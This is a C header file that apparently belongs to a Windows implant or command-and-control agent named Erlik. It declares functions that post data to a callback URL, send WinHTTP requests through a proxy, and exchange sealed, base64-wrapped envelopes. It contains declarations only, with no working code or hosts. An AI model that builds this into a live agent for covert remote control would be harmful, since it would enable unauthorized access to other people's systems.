#ifndef ERLIK_HTTP_H
#define ERLIK_HTTP_H

#include "common.h"

/* POST body to the callback URL, return response body (caller frees). */
int http_post(const agent_config_t *cfg, const char *body, char **resp_out);

/* Generic request over WinHTTP (proxy from cfg). Status via status_out,
 * malloc'd NUL-terminated body via resp_out. */
int http_request(const agent_config_t *cfg, const char *host, int secure, int port,
                 const char *method, const char *path, const char *headers,
                 const unsigned char *body, size_t body_len,
                 unsigned char **resp_out, size_t *resp_len_out, int *status_out);

/* Raw-envelope exchange over the http profile (base64 at the edges). */
int http_exchange(const agent_config_t *cfg, const unsigned char *sealed, size_t sealed_len,
                  unsigned char **out, size_t *out_len);

#endif
